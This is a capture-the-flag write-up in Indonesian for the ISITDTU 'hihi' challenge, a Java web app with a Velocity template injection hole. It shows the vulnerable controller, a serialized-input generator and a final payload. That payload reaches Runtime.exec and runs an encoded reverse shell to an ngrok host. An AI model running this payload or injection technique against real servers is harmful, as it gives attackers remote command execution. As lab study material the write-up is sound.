# ISITDTU - hihi - Writeup
Pada challenge kali ini kita dihadapkan dengan web java yang melakukan deserialisasi, dan hasil deserialisasi akan ditampilkan di template Velocity, yang mana rentan terhadap SSTI, berikut merupakan source code nya

## Source Code
MainController.java
```java
package com.isitdtu.hihi.Controllers;

import org.apache.velocity.app.Velocity;
import org.apache.velocity.VelocityContext;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import com.isitdtu.hihi.Helpers.Encode;
import com.isitdtu.hihi.Helpers.SecureObjectInputStream;
import com.isitdtu.hihi.Users;
import java.io.IOException;
import java.io.ObjectInputStream;

import java.io.ByteArrayInputStream;
import java.time.LocalDate;
import java.time.format.DateTimeFormatter;
import java.io.StringWriter;
import java.util.Base64;

@Controller
public class MainController {
    @GetMapping("/")
    @ResponseBody
    public String index(){

        return "hey";
    }

    @PostMapping(value = "/")
    @ResponseBody
    public String hello(@RequestParam("data") String data) throws IOException {
        String hexString = new String(Base64.getDecoder().decode(data));
        byte[] byteArray = Encode.hexToBytes(hexString);
        ByteArrayInputStream bis = new ByteArrayInputStream(byteArray);
        ObjectInputStream ois = new SecureObjectInputStream(bis);
        String name;
        try{
            Users user = (Users) ois.readObject();
            name= user.getName();
        } catch (Exception e) {
            throw new RuntimeException(e);
        }
        if(name.toLowerCase().contains("#")){
            return "But... For what?";
        }
        String templateString = "Hello, " + name+". Today is $date";
        Velocity.init();
        VelocityContext ctx = new VelocityContext();
        LocalDate date = LocalDate.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("MMMM dd, yyyy");
        String formattedDate = date.format(formatter);
        ctx.put("date", formattedDate);
        StringWriter out = new StringWriter();
        Velocity.evaluate(ctx, out, "test", templateString);
        return out.toString();
    }
}
```

terdapat pemanggilan fungsi `SecureObjectInputStream`, sehingga mustahil untuk melakukan `Java Deserialization Exploit`, karena SecureObjectInputStream hanya mengizinkan class yang diakses adlaah class Users aja.

untuk melakukan post pertama tama kita harus melakukan generate inputan yang sesuai dengan yang diharapkan oleh applikasi, berikut merupakan kode untuk generate nya

```java
public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        System.out.print("Masukkan nama (dalam Base64): ");
        String inputName = scanner.nextLine();

        try {
            // Decode Base64 dan convert ke byte array
            Users user1 = new Users(inputName);
            ByteArrayOutputStream bos = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(bos);
            oos.writeObject(user1);
            oos.flush();
            byte[] userBytes = bos.toByteArray();
            oos.close();
            bos.close();

            StringBuilder hexString1 = new StringBuilder();
            for (byte b : userBytes) {
                hexString1.append(String.format("%02x", b));
            }
            String hexOutput = hexString1.toString();
            System.out.println("Hex String: " + hexOutput);

            String base64User = Base64.getEncoder().encodeToString(hexOutput.getBytes());
            System.out.println("Base64 Input: " + base64User);
        } catch (IOException e) {
            System.err.println("IOException terjadi: " + e.getMessage());
        } catch (ClassNotFoundException e) {
            System.err.println("ClassNotFoundException terjadi: " + e.getMessage());
        } finally {
            scanner.close();
        }
```

terlihat dari kode maincontroller.java, terdapat SSTI velocity yang terjadi disana, namun karena adanya filter `#`, ini membuat hal menjadi terbatas,

pertama tama dicoba SSTI untuk memunculkan date dengan inputan `$date`, dan output menunjukan bahwa memang terdapat SSTI, selanjutnya kita akan langsung eksekusi reverse shell, berikut payload nya
```
$date.getClass().forName(\'java.lang.Runtime\').getMethod(\'getRuntime\', null).invoke(null, null).exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8wLnRjcC5hcC5uZ3Jvay5pby8xNjQ0OSAwPiYxCg==}|{base64,-d}|{bash,-i}")

```